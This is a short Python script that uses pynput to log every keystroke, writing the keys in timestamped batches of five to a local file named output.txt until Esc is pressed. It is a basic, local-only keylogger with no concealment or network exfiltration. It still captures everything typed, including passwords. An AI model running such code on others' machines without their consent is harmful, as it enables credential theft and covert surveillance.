import pynput
from pynput.keyboard import Key, Listener
from datetime import datetime

count = 0
keys = []


def get_key_name(key):
    """
    Convert the key name into a readable format.

    Args:
        key: The key input from the listener.

    Returns:
        A string representing the key.
    """
    if hasattr(key, 'char') and key.char:
        return key.char
    elif key == Key.space:
        return ' '
    elif key in [Key.shift, Key.ctrl, Key.alt, Key.cmd]:
        return ''
    else:
        return str(key)


def on_press(key):
    global keys, count

    key_name = get_key_name(key)
    if key_name:  # Only add keys if they are not modifier keys
        keys.append(key_name)
        count += 1

    if count >= 5:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("output.txt", "a") as f:
        f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - ")
        for key in keys:
            f.write(key)
        f.write('\n')


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
